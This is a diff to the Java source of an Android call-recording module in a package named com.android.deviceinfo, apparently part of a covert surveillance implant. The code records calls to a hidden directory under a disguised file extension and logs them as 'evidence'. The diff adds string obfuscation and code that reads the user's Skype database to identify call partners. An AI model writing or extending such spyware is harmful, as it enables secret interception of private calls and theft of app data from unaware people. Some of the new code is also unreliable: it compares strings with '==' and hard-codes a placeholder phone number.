@@ -20,17 +20,21 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.TimeUnit;
 
+import android.app.ActivityManager.RunningAppProcessInfo;
 import android.media.MediaRecorder;
 import android.os.Build;
 import android.os.FileObserver;
 
 import com.android.deviceinfo.Call;
 import com.android.deviceinfo.Device;
+import com.android.deviceinfo.ProcessInfo;
+import com.android.deviceinfo.RunningProcesses;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
+import com.android.deviceinfo.db.GenericSqliteHelper;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
@@ -38,6 +42,8 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
+import com.android.deviceinfo.listener.ListenerProcess;
+import com.android.deviceinfo.module.chat.ChatSkype;
 import com.android.deviceinfo.util.AudioEncoder;
 import com.android.deviceinfo.util.ByteArray;
 import com.android.deviceinfo.util.CallBack;
@@ -49,6 +55,7 @@ import com.android.deviceinfo.util.ICallBack;
 import com.android.deviceinfo.util.Instrument;
 import com.android.deviceinfo.util.Utils;
 import com.android.deviceinfo.util.WChar;
+import com.android.m.M;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
@@ -85,6 +92,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
 
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
+	private RunningProcesses runningProcesses;
+	private CallInfo callInfo;
 
 	@Override
 	public boolean parse(ConfModule conf) {
@@ -112,6 +121,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	public void actualStart() {
 		ListenerCall.self().attach(this);
 
+		runningProcesses = new RunningProcesses();
+		callInfo = new CallInfo();
+		
 		if (recordFlag) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualStart): recording calls"); //$NON-NLS-1$
@@ -433,7 +445,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (stopRecord()) {
 				Object future = Status.getStpe().schedule(new Runnable() {
 					public void run() {
-						saveCallEvidence(call.getNumber(), incoming, call.getTimeBegin(), call.getTimeEnd(),
+						String myNumber = Device.self().getPhoneNumber();
+						saveCallEvidence(call.getNumber(), myNumber, incoming, call.getTimeBegin(), call.getTimeEnd(),
 								currentRecordFile, true, 1);
 					}
 				}, 100, TimeUnit.MILLISECONDS);
@@ -466,7 +479,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		String tmp = ts.toString();
 
 		// Logfile .3gpp in chiaro, temporaneo
-		String path = Path.hidden() + tmp + ".qzt";
+		String path = Path.hidden() + tmp + M.e(".qzt");
 
 		ModuleMic mic = ModuleMic.self();
 
@@ -492,14 +505,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return false;
 	}
 
-	private boolean saveCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd,
+	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + dateBegin
+			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " peer: " + peer + " from: " + dateBegin
 					+ " to: " + dateEnd + " incoming: " + incoming);
 		}
 
-		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
+		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin), new DateTime(
 				dateEnd), channel);
 
 		AutoFile file = new AutoFile(currentRecordFile);
@@ -548,12 +561,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 	}
 	
-	private void closeCallEvidence(String number, boolean incoming, Date dateBegin, Date dateEnd) {
-		final byte[] additionaldata = getCallAdditionalData(number, incoming, new DateTime(dateBegin), new DateTime(
+	private void closeCallEvidence(String peer, String number, boolean incoming, Date dateBegin, Date dateEnd) {
+		final byte[] additionaldata = getCallAdditionalData(peer, number, incoming, new DateTime(dateBegin), new DateTime(
 				dateEnd), CHANNEL_LOCAL);
 		
 		if (Cfg.DEBUG) {
-			Check.log(TAG + "(closeCallEvidence): closing call for " + number);
+			Check.log(TAG + "(closeCallEvidence): closing call for " + peer);
 		}
 		
 		EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
@@ -582,20 +595,20 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return pos;
 	}
 
-	private byte[] getCallAdditionalData(String number, boolean incoming, DateTime dateBegin, DateTime dateEnd, int channels) {
+	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin, DateTime dateEnd, int channels) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (getCallAdditionalData): " + number);
+			Check.log(TAG + " (getCallAdditionalData): " + peer);
 		}
 
 		if (Cfg.DEBUG) {
-			Check.asserts(number != null, " (getCallAdditionalData) Assert failed, null number");
+			Check.asserts(peer != null, " (getCallAdditionalData) Assert failed, null number");
 		}
 
 		byte[] caller;
 		byte[] callee;
 
-		callee = WChar.getBytes(Device.self().getPhoneNumber());
-		caller = WChar.getBytes(number);
+		callee = WChar.getBytes(myNumber);
+		caller = WChar.getBytes(peer);
 
 		final int version = 2008121901; // CALL_LOG_VERSION
 		final int program = 0x0145; // LOGTYPE_CALL_MOBILE
@@ -683,34 +696,34 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
 		}
 		// TODO: in Messages
-		if (model.contains("i9100")) { // Samsung Galaxy S2
+		if (model.contains(M.e("i9100"))) { // Samsung Galaxy S2
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
 			}
-		} else if (model.contains("galaxy nexus")) { // Samsung Galaxy Nexus
+		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy Nexus
 			supported = true;
 			strategy = MediaRecorder.AudioSource.DEFAULT;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
 			}
-		} else if (model.contains("gt-i9300")) { // Galaxy S3
+		} else if (model.contains(M.e("gt-i9300"))) { // Galaxy S3
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
 			}
-		} else if (model.contains("xt910")) { // Motorola xt-910
+		} else if (model.contains(M.e("xt910"))) { // Motorola xt-910
 			supported = false;
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
 			}
-		} else if (model.contains("gt-p1000")) { // Samsung Galaxy Tab 7''
+		} else if (model.contains(M.e("gt-p1000"))) { // Samsung Galaxy Tab 7''
 			supported = true;
 			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
 
@@ -874,7 +887,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
 						}
-
 						return i;
 					}
 				}
@@ -961,15 +973,25 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				remote = 0;
 			}
 
+			if (!updateCallInfo()){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (encodeChunks): unknown call program");
+				}
+				return;
+			}
+			
+			String peer = callInfo.peer;
+			String myNumber = "my number";
 			// Encode to evidence
 			// TODO add caller/callee phone number and right timestamps
-			saveCallEvidence("God from heaven", true, begin, end, encodedFile, false, remote);
+			saveCallEvidence(peer, myNumber, true, begin, end, encodedFile, false, remote);
 
 			// We have an end of call and it's on both channels
 			if (audioEncoder.isLastCallFinished() && encodedFile.endsWith("-r.tmp.err")) {
 				// After encoding create the end of call marker
-				closeCallEvidence("God from heaven", true, begin, end);
-
+				closeCallEvidence(peer, myNumber, true, begin, end);
+				callInfo = new CallInfo();
+				
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(encodeChunks): end of call reached");
 				}
@@ -985,6 +1007,29 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		audioEncoder.removeRawFile();
 	}
 	
+	private boolean updateCallInfo() {
+		RunningAppProcessInfo fore = runningProcesses.getForeground();
+		if(fore.processName == callInfo.processName){
+			return true;
+		}
+		
+		callInfo.processName = fore.processName;
+		if(fore.processName == "com.skype.raider"){
+			// open DB
+			String account = ChatSkype.readAccount();
+			GenericSqliteHelper helper = ChatSkype.openSkypeDBHelper(account);
+			
+			boolean ret = false;
+			if(helper!=null){
+				ret = ChatSkype.getCurrentCall(helper, callInfo);
+			}
+			
+			return ret;
+		}
+		return false;
+	}
+
+
 	public class InternalCallBack implements ICallBack {
 		private static final String TAG = "InternalCallBack";
 		
